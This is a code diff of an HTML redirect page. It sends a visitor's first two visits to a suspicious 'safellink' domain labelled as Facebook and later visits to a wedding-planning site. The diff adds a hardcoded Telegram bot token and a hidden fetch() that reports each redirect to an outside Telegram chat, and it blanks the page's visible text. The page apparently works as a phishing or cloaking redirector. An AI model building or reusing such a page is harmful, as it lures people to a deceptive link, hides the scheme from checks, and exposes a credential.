@@ -5,30 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirect Control</title>
     <script>
-        // Editable maximum number of redirects to Facebook
         const maxRedirectsToFacebook = 2;
 
-        // Get the current count of redirects from localStorage
+        const telegramToken = "6946070846:AAGk0yX0X9A4d7K2fIOBWnVPEtMDQhzuq2c"; // Replace with your Telegram bot token
+        const chatID = "1576612481"; // Replace with your Telegram chat ID
+
+        const notifyTelegram = async (message) => {
+            const telegramURL = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            try {
+                await fetch(telegramURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatID, text: message })
+                });
+            } catch (error) {
+                console.error("Failed to send Telegram notification:", error);
+            }
+        };
+
         let redirectCount = parseInt(localStorage.getItem('redirectCount')) || 0;
 
-        // Check if the redirect count exceeds the limit
         if (redirectCount < maxRedirectsToFacebook) {
-            // Increment and store the new count
             redirectCount++;
             localStorage.setItem('redirectCount', redirectCount);
 
-            // Redirect to Facebook
+            notifyTelegram(`Redirected to Facebook. Visit count: ${redirectCount}`);
             window.location.href = "https://m1-20a-o0safellink.exchange/90298365256387386538763933";
         } else {
-            // Redirect to Google after the limit is reached
+            notifyTelegram(`Redirected to Bridebook after ${redirectCount} visits.`);
             window.location.href = "https://www.bridebook.com";
         }
     </script>
 </head>
 <body>
-    <h1>Redirect Control</h1>
-    <p id="message">Redirecting...</p>
-    <p>To change the redirect limit, edit the `maxRedirectsToFacebook` value in this HTML file.</p>
+    <h1></h1>
+    <p id="message"> </p>
 </body>
 </html>
-
